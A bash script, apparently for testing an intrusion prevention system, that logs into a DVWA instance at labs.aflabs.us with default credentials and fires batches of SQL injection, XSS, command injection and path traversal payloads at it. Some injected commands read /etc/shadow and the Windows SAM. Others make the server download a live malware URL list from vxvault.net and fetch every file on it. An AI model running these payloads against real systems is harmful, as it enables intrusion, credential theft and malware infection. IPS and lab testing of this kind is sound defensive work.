#!/bin/bash

# Define the correct base URL for DVWA
BASE_URL="http://labs.aflabs.us"
LOGIN_URL="${BASE_URL}/login.php"
MALWARE_URL_1="http://malware.wicar.org/data/eicar.com"
MALWARE_URL_2="http://malware.wicar.org/data/ms09_072_style_object.html"

echo "Logging into DVWA to capture PHPSESSID..."

# Login to DVWA and capture the PHPSESSID
LOGIN_RESPONSE=$(curl -i -s -k -X POST -d "username=admin&password=password&Login=Login" "${LOGIN_URL}")
PHPSESSID=$(echo "$LOGIN_RESPONSE" | grep -oP 'PHPSESSID=\K[^;]+')

if [ -z "$PHPSESSID" ]; then
    echo "Failed to capture PHPSESSID. Please check the login credentials and try again."
    exit 1
fi

echo "Captured PHPSESSID: $PHPSESSID"

# Set security level to low (ensure DVWA is in low security mode)
SECURITY_URL="${BASE_URL}/security.php"
curl -i -s -k -X POST -d "security=low&seclev_submit=Submit" "${SECURITY_URL}" --cookie "PHPSESSID=$PHPSESSID"

echo "Testing IPS with various attacks on DVWA..."

#########################
# SQL Injection Tests
#########################

echo "Running SQL Injection Tests..."

SQLI_URL="${BASE_URL}/vulnerabilities/sqli/"

curl -i -s -k "${SQLI_URL}?id=1' OR '1'='1&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' UNION SELECT null,null--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' AND 1=0--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' OR 1=1--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' AND 'x'='x&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' AND EXISTS(SELECT 1)--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' OR 'a'='a&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 64--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' AND BENCHMARK(1000000,MD5('test'))--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${SQLI_URL}?id=1' OR SLEEP(5)--&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Cross-Site Scripting (XSS) Tests
#########################

echo "Running XSS Tests..."

XSS_URL="${BASE_URL}/vulnerabilities/xss_r/"

curl -i -s -k "${XSS_URL}?name=<script>alert('XSS')</script>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<img src=x onerror=alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<iframe src=javascript:alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<body onload=alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<svg/onload=alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<details open ontoggle=alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<object data=javascript:alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<b onmouseover=alert('XSS')>hover</b>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<button onclick=alert('XSS')>Click Me</button>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${XSS_URL}?name=<input type='text' onfocus=alert('XSS')>&btnG=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Command Injection Tests
#########################

echo "Running Command Injection Tests..."

CMD_INJ_URL="${BASE_URL}/vulnerabilities/exec/"

curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;ls&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;cat /etc/passwd&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;whoami&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;curl http://vxvault.net/URL_List.php > urls.txt&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;wget -i urls.txt --tries=1 --timeout=5&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;ping -c 4 google.com&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;echo $(id)&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;ifconfig&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;netstat -an&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${CMD_INJ_URL}?ip=127.0.0.1;nslookup google.com&Submit=Submit" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Directory Traversal Tests
#########################

echo "Running Directory Traversal Tests..."

DIR_TRAV_URL="${BASE_URL}/vulnerabilities/fi/"

curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/passwd" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../boot.ini" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/shadow" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../windows/system32/config/system" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/hosts" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/group" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../windows/system.ini" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../etc/network/interfaces" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../windows/win.ini" --cookie "PHPSESSID=$PHPSESSID" -X GET
curl -i -s -k "${DIR_TRAV_URL}?page=../../../../windows/repair/sam" --cookie "PHPSESSID=$PHPSESSID" -X GET

#########################
# Malware Injection Simulation
#########################

echo "Running Malware Injection Simulations..."

curl -i -s -k "${MALWARE_URL_1}" -O eicar.com
curl -i -s -k "${MALWARE_URL_2}" -O ms09_072_style_object.html

echo "IPS testing completed."
